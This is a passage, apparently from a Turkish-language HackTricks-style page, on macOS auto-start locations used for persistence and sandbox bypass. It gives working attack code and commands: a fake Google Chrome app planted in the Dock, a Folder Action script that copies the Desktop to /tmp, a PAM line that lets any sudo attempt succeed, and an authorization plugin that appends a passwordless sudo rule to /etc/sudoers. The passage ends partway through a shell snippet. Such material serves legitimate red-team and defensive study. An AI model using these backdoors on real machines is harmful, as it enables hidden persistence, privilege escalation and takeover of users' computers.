Eğer bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** onu açar ve örneğin zip **`~/Library`** içinde saklanmışsa ve içinde **`LaunchAgents/file.plist`** adlı bir klasör ile bir backdoor bulunuyorsa, o klasör oluşturulur (varsayılan olarak oluşturulmaz) ve plist eklenir; böylece kullanıcı bir dahaki oturum açışında, plist içinde belirtilen backdoor çalıştırılacaktır.

Diğer bir seçenek, kullanıcı HOME içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır; böylece LaunchAgents klasörü zaten mevcut olsa bile bu teknik yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`**'i **çalıştırmanız** gerekir ve **etkinleştirilmiş** olmalıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`at`**'i **çalıştırmanız** gerekir ve **etkinleştirilmiş** olmalıdır

#### **Açıklama**

`at` görevleri belirli zamanlarda çalıştırılmak üzere **tek seferlik görevleri zamanlamak** için tasarlanmıştır. Cron jobs'ların aksine, `at` görevleri yürütme sonrası otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmaları boyunca kalıcı olduğunu not etmek önemlidir; bu durum belirli koşullar altında potansiyel güvenlik endişeleri oluşturabilir.

Varsayılan olarak **devre dışı**dırlar, ancak **root** kullanıcısı **bunları** **etkinleştirebilir** şu komutla:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` kullanarak iş kuyruğunu kontrol edin.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda iki işin zamanlandığını görebiliriz. İşin ayrıntılarını `at -c JOBNUMBER` ile yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT görevleri etkin değilse oluşturulan görevler çalıştırılmayacaktır.

**İş dosyaları** şu konumda bulunur: `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı kuyruk, iş numarası ve çalıştırılmasının planlandığı zamanı içerir. Örneğin `a0001a019bdcd2`'ye bakalım.

- `a` - bu kuyruk
- `0001a` - onaltılık (hex) iş numarası, `0x1a = 26`
- `019bdcd2` - onaltılık (hex) zaman. Epoch'ten bu yana geçen dakikaları temsil eder. `0x019bdcd2` ondalık olarak `26991826`'dır. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00`'tır.

İş dosyasını yazdırırsak, `at -c` ile aldığımız aynı bilgileri içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions'ı yapılandırabilmek için `osascript`'i argümanlarla çağırıp **`System Events`** ile iletişim kurabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root gerekli
- **Trigger**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Belirtilen klasöre erişim

#### Description & Exploitation

Folder Actions, bir klasörde öğe ekleme, kaldırma veya klasör penceresini açma/yeniden boyutlandırma gibi değişiklikler olduğunda otomatik olarak tetiklenen script'lerdir. Bu eylemler çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yollarla tetiklenebilir.

Folder Actions'ı ayarlamak için şu seçenekleriniz var:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow'u oluşturup bunu bir servis olarak yüklemek.
2. Bir klasörün bağlam menüsündeki Folder Actions Setup aracılığıyla bir script'i manuel olarak eklemek.
3. OSAScript kullanarak Apple Event mesajlarını `System Events.app`'e gönderip programlı olarak bir Folder Action ayarlamak.
- Bu yöntem, eylemi sisteme yerleştirmek için özellikle kullanışlıdır ve bir seviyede persistence sağlar.

Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek örneklerden biridir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki betiği Folder Actions ile kullanılabilir hale getirmek için şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra, aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı küresel olarak etkinleştirecek ve daha önce derlenen script'i özellikle Desktop klasörüne ekleyecektir.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum betiğini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu persistence'i GUI aracılığıyla uygulama şekli:

İşte çalıştırılacak script:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şu komutla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Sonra `Folder Actions Setup` uygulamasını açın, izlemek istediğiniz **klasörü** seçin ve kendi durumunuzda **`folder.scpt`**'i seçin (benim durumumda buna `output2.scp` adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi, eğer o klasörü **Finder** ile açarsanız, script'iniz çalıştırılacaktır.

Bu yapılandırma base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda bulunan **plist** içinde saklandı.

Şimdi, GUI erişimi olmadan bu persistence'i hazırlamayı deneyelim:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`'i yedeklemek için `/tmp`'ye kopyalayın:**
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Ayarladığınız **Folder Actions**'ları **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Şimdi boş bir ortamımız olduğuna göre

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu konfigürasyonu uygulamak için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Ve bu benim için çalışmadı, ama bunlar writeup'tan gelen talimatlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak sisteme kötü amaçlı bir uygulama kurmuş olmanız gerekiyor
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Tetikleyici**: Kullanıcı dock içindeki uygulamaya tıkladığında

#### Açıklama ve İstismar

Dock'ta görünen tüm uygulamalar plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**

Bir uygulama **eklemek** sadece şununla mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Biraz **social engineering** kullanarak dock içinde **örneğin Google Chrome'u taklit ederek** kendi betiğinizi gerçekten çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok spesifik bir eylemin gerçekleşmesi gerekiyor
- Sonunda başka bir sandbox'a düşersiniz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekli
- Tetikleyici: Renk seçiciyi kullanın
- `~/Library/ColorPickers`
- Tetikleyici: Renk seçiciyi kullanın

#### Açıklama & Exploit

**Kodunuzla bir renk seçici bundle'ı derleyin** (örneğin [**bunu**](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz) ve bir constructor ekleyin ( [Screen Saver section](macos-auto-start-locations.md#screen-saver) bölümündeki gibi) ve bundle'ı `~/Library/ColorPickers`'e kopyalayın.

Ardından, renk seçici tetiklendiğinde siz de tetiklenmiş olacaksınız.

Kütüphanenizi yükleyen ikili dosyanın **çok kısıtlayıcı bir sandbox**a sahip olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

Yazı: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
Yazı: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Sandbox atlatmak için kullanışlı mı: **Hayır, çünkü kendi app'inizi çalıştırmanız gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir app

#### Açıklama & Exploit

Finder Sync Extension ile bir uygulama örneği [**can be found here**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilecektir. Ayrıca, extension'ın kodunu çalıştırabilmesi için geçerli bir Apple developer certificate ile **imzalanmış olması gerekir**, **sandboxed** olması gerekir (ancak gevşetilmiş istisnalar eklenebilir) ve şu gibi bir şeyle kayıtlı olması gerekir:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Sandbox'ı bypass etmek için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak sonunda ortak bir application sandbox'a düşersiniz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gerekli
- **Trigger**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
- Root gerekli
- **Trigger**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
- **Trigger**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama & Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından, kodunuzu buna ekleyin; örneğin aşağıdaki kod log üretmek için.

**Build** edin ve `.saver` bundle'ını **`~/Library/Screen Savers`** altına kopyalayın. Sonra Screen Saver GUI'sini açın ve üzerine tıklarsanız çok sayıda log üretmesi gerekir:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen ikili dosyanın entitlements içinde (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** bulunduğunu unutmayın; bu yüzden **ortak uygulama sandbox'ının içinde olacaksınız**.

Saver kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Sandbox atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak uygulama sandbox'ına yönlendirileceksiniz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturuldu.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturuldu.
- Root gerekli
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturuldu.
- Root gerekli
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturuldu.
- Yeni uygulama gerekli

#### Açıklama ve İstismar

Spotlight, kullanıcılara bilgisayarlarındaki verilere **hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama yeteneğini kolaylaştırmak için Spotlight, bir **özel veritabanı** tutar ve çoğu dosyayı **ayrıştırarak** bir dizin oluşturur; böylece dosya adları ve içeriklerinde hızlı aramalar yapılabilir.

Spotlight'ın altında yatan mekanizma, 'mds' adlı merkezi bir süreç içerir; bu, **'metadata server'** anlamına gelir. Bu süreç tüm Spotlight hizmetini koordine eder. Buna ek olarak, farklı dosya türlerini dizinleme gibi çeşitli bakım görevlerini yerine getiren birden fazla 'mdworker' daemon'u vardır (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugins veya **".mdimporter bundles**" aracılığıyla mümkün olur; bunlar Spotlight'ın çeşitli dosya formatlarındaki içeriği anlamasını ve dizinlemesini sağlar.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce bahsedilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında dakika içinde yüklenir (herhangi bir servisi yeniden başlatmaya gerek yok). Bu bundle'ların hangi **yönetebilecekleri dosya türü ve uzantıları** belirlemesi gerekir; bu sayede Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Çalışır durumdaki **tüm `mdimporters`**'ı bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter** bu tür dosyaları (uzantılar `.iba` ve `.book` dahil olmak üzere) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Eğer diğer `mdimporter`ların Plist'ine bakarsanız **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
>
> Ayrıca, System varsayılan plugin'leri her zaman önceliklidir, bu yüzden bir saldırgan yalnızca Apple's kendi `mdimporters` tarafından indekslenmeyen dosyalara erişebilir.

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Artık çalışmıyor gibi görünüyor.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir kullanıcı eylemi gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Artık çalışmıyor gibi görünüyor.

## Root Sandbox Bypass

> [!TIP]
> Burada, bir şeyi basitçe **bir dosyaya yazarak** (**writing it into a file**) çalıştırmanızı sağlayan ve **root** olmayı ve/veya diğer **garip koşulları** gerektirebilen **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak **root** olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root required
- **Trigger**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Root required
- **Trigger**: Zamanı geldiğinde

#### Description & Exploitation

Periodic betikleri (**`/etc/periodic`**) `/System/Library/LaunchDaemons/com.apple.periodic*` içinde yapılandırılmış **launch daemons** nedeniyle çalıştırılır. `/etc/periodic/` içinde saklanan betiklerin dosya sahibi olarak **çalıştırıldığını** (**executed**) unutmayın; bu yüzden bu, potansiyel bir hak yükseltme için işe yaramaz.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Yürütülecek başka periodic scripts **`/etc/defaults/periodic.conf`** dosyasında belirtilmiştir:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Eğer `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, er ya da geç **çalıştırılacaktır**.

> [!WARNING]
> Periyodik betik **sahibinin kimliğiyle çalıştırılacağını** unutmayın. Yani eğer normal bir kullanıcı betiğin sahibi ise, betik o kullanıcı olarak çalıştırılacaktır (bu yetki yükseltme saldırılarını engelleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Sandbox'ı bypass etmek için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Root her zaman gereklidir

#### Açıklama ve Sömürme

PAM daha çok macOS içinde kolay çalıştırma yerine **persistence** ve malware üzerine odaklandığından, bu blog detaylı bir açıklama vermeyecek; bu tekniği daha iyi anlamak için **writeupları okuyun**.

Check PAM modules with:
```bash
ls -l /etc/pam.d
```
PAM'i kötüye kullanan bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar basittir:
```bash
auth       sufficient     pam_permit.so
```
Yani **şöyle görünecek**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Bu nedenle herhangi bir **`sudo` kullanma denemesi işe yarayacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu ve kullanıcının erişim için bir istem (prompt) ile karşılaşma olasılığının yüksek olduğunu unutmayın.

Başka güzel bir örnek su'dur; burada PAM modüllerine parametre vermenin mümkün olduğunu görebilirsiniz (ve bu dosyayı backdoor'layabilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Yetkilendirme Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Yazı: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ek yapılandırmalar yapmanız gerekiyor
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gerekli
- Eklentiyi kullanmak için yetkilendirme veritabanını da yapılandırmanız gerekiyor

#### Açıklama ve Sömürme

Bir kullanıcı oturum açtığında çalıştırılacak ve kalıcılık sağlayacak bir authorization plugin oluşturabilirsiniz. Bu eklentilerden birini nasıl oluşturacağınıza dair daha fazla bilgi için önceki yazılara bakın (ve dikkatli olun, kötü yazılmış bir eklenti sizi kilitleyebilir ve mac'inizi recovery modundan temizlemeniz gerekebilir).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşı** bundle'ı yüklenecek konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak bu Plugin'i yüklemek için **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

